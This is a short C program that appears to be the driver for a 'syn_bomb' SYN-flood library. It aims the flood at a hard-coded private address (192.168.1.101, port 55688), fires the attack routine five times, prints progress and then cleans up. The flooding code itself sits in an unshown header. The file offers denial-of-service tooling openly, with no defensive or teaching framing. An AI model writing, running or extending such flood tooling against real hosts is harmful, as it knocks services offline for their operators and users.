#include "syn_bomb.h"

/**
 * [main description]
 * @param  argc [description]
 * @param  argv [description]
 * @return      [description]
 */
int main(int argc, char const *argv[])
{
	int i = 0;
	struct syn_bomb bomb;
	libsynbomb_init(&bomb, NULL, "192.168.1.101", 55688);

	printf(KBLU_L"local ip:%s, target ip:%s & port: %d"RESET"\n", bomb.local_ip, bomb.target_ip, bomb.target_port);

	while ( i < 5) {
		bomb.service(&bomb);
		i++;
		printf(KGRN_L"syn bomb has do %d times"RESET"\n", i);
	}


	sleep(90);
	libsynbomb_clean(&bomb);
	return 0;

}